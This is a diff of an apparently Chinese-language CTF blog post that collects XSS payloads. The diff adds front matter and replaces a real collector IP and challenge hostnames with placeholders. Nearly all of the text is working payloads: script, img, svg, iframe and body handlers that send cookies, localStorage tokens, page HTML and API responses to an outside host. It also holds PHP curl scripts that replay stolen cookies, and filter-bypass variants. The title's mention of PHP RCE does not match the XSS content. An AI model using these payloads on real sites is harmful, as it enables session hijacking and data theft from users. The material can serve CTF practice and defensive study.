@@ -1,31 +1,39 @@
+---
+title: PHP自增RCE构造
+date: 2026-02-07
+category: web
+tags: ["web", "ctf", "基础漏洞"]
+excerpt: 打靶时整理的一些payload
+---
+
 # XSS
 
 ## 1.自动触发cookie窃取
 
 ### 1.script嵌入脚本
 
- `<script>location.href="http://123.56.172.183/get_flag.php?c="+document.cookie</script>`
+ `<script>location.href="http://ip/get_flag.php?c="+document.cookie</script>`
 
 ### 2.图片异常
 
-`<img src="xxx" onerror="location.href='http://123.56.172.183/get_flag.php?c='+document.cookie">`
+`<img src="xxx" onerror="location.href='http://ip/get_flag.php?c='+document.cookie">`
 
 ### 3.svg文本加载
 
-`<svg onload="location.href='http://123.56.172.183/get_flag.php?c='+document.cookie"/>`
+`<svg onload="location.href='http://ip/get_flag.php?c='+document.cookie"/>`
 
 ### 4.内嵌网页
 
-`<iframe onload=window.location.href='http://123.56.172.183/get_flag.php?c='+document.cookie;>`
+`<iframe onload=window.location.href='http://ip/get_flag.php?c='+document.cookie;>`
 
 ### 5.body闭合
 
-`<body onload=location.href='http://123.56.172.183/get_flag.php?c='+document.cookie>`
+`<body onload=location.href='http://ip/get_flag.php?c='+document.cookie>`
 
 ### 6.jQuery 选择器语法脚本
 
 ```
-<script>$('.laytable-cell-1-0-1').each(function(index, value){if(value.innerHTML.indexOf('ctf'+'show'+'{')>-1){ window.location.href='http://123.56.172.183/get_flag.php?c='+value.innerHTML;}});</script>
+<script>$('.laytable-cell-1-0-1').each(function(index, value){if(value.innerHTML.indexOf('ctf'+'flag'+'{')>-1){ window.location.href='http://ip/get_flag.php?c='+value.innerHTML;}});</script>
 ```
 
 ### 7.请求伪造脚本
@@ -36,17 +44,17 @@ if(isset($_GET['c']))
 {
 	$c = $_GET['c'];
 	$ch = curl_init();
-	curl_setopt($ch,CURLOPT_URL,'https://a918bd33-9936-48d8-a790-481cb94e0145.challenge.ctf.show/api/?page=1&limit=10'); 
+	curl_setopt($ch,CURLOPT_URL,'https://target_url'); 
     curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
 	curl_setopt($ch,CURLOPT_COOKIE,$c);
 	curl_setopt($ch, CURLOPT_HTTPHEADER, [
-    "Host: a918bd33-9936-48d8-a790-481cb94e0145.challenge.ctf.show",
+    "Host: host_url",
     "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
     "Accept: application/json, text/javascript, */*; q=0.01",
     "Accept-Language: zh-CN,zh;q=0.9",
     "Accept-Encoding: gzip, deflate, br, zstd",
     "X-Requested-With: XMLHttpRequest",
-    "Referer: https://a918bd33-9936-48d8-a790-481cb94e0145.challenge.ctf.show/manager.php",
+    "Referer: https://referer_url",
     "DNT: 1",
     "Connection: close"
 	]);
@@ -69,16 +77,16 @@ $cookie = $_GET['c'];
 $ch = curl_init();
 
 // 设置cURL选项
-curl_setopt($ch, CURLOPT_URL, "http://fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show/api/change.php?p=111");
+curl_setopt($ch, CURLOPT_URL, "http://target_url");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 返回数据而不是直接输出
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
-    "Host: fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show",
+    "Host: host_url",
     "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
     "Accept: */*",
     "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
     "Accept-Encoding: gzip, deflate",
     "X-Requested-With: XMLHttpRequest",
-    "Referer: http://fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show/change.php",
+    "Referer: referer_url",
     "Cookie: {$cookie}",
     "DNT: 1",
     "Connection: close"
@@ -106,7 +114,7 @@ curl_close($ch);
 ```
 
 ```
-<script>var gen = new XMLHttpRequest();gen.open('GET', '/api/search', false);gen.send(null);if (gen.status === 200){var t = gen.responseText;new Image().src = "http://123.56.172.183/get_flag.php?c="+encodeURIComponent(t.slice(0, 2000));}</script>
+<script>var gen = new XMLHttpRequest();gen.open('GET', '/api/search', false);gen.send(null);if (gen.status === 200){var t = gen.responseText;new Image().src = "http://ip/get_flag.php?c="+encodeURIComponent(t.slice(0, 2000));}</script>
 ```
 
 ### 8.题目分享，一个很有意思的payload
@@ -141,30 +149,31 @@ Connection: close
 
 ## 2.tooken
 
-`<img src=x onerror='fetch("http://123.56.172.183/get_flag.php?c="+encodeURIComponent(localStorage.token))'>`
+`<img src=x onerror='fetch("http://ip/get_flag.php?c="+encodeURIComponent(localStorage.token))'>`
 
 ## 3.html界面
 
-`<img src="x" onerror="(new Image()).src='http://123.56.172.183/?c='+encodeURIComponent(document.body.innerHTML);">`
+`<img src="x" onerror="(new Image()).src='http://ip/?c='+encodeURIComponent(document.body.innerHTML);">`
 
 ## 4.响应体数据外带
 
 ```
-<img src=x onerror="fetch('/api/archives').then(r=>r.json()).then(data=>{new Image().src='http://123.56.172.183/get_flag.php?c='+btoa(JSON.stringify(data));});">
+<img src=x onerror="fetch('/api/archives').then(r=>r.json()).then(data=>{new Image().src='http://ip/get_flag.php?c='+btoa(JSON.stringify(data));});">
 ```
 
 ## 5.bypass
 
-空格过滤，/分隔标签 ，/**/注释
+空格过滤，/分隔标签 ，/**/空注释
 
-`<svg/onload="location.href='http://123.56.172.183/get_flag.php?c='+document.cookie"/>`
+`<svg/onload="location.href='http://ip/get_flag.php?c='+document.cookie"/>`
 
-`<svg/**/onload="location.href='http://123.56.172.183/get_flag.php?c='+document.cookie"/>`
+`<svg/**/onload="location.href='http://ip/get_flag.php?c='+document.cookie"/>`
 
 大小写绕过
 
-`<ScrIpt></&lt;script>location.href=&quot;http://123.56.172.183/get_flag.php?c=&quot;+document.cookie</ScrIpt>`
+`<ScrIpt></&lt;script>location.href=&quot;http://ip/get_flag.php?c=&quot;+document.cookie</ScrIpt>`
 
 双写绕过
 
-`<scrscriptipt>location.href="http://123.56.172.183/get_flag.php?c="+document.cookie</scrscriptipt>`
+比如后端把payload中的script删除，这时候可以这样构造
+`<scrscriptipt>location.href="http://ip/get_flag.php?c="+document.cookie</scrscriptipt>`
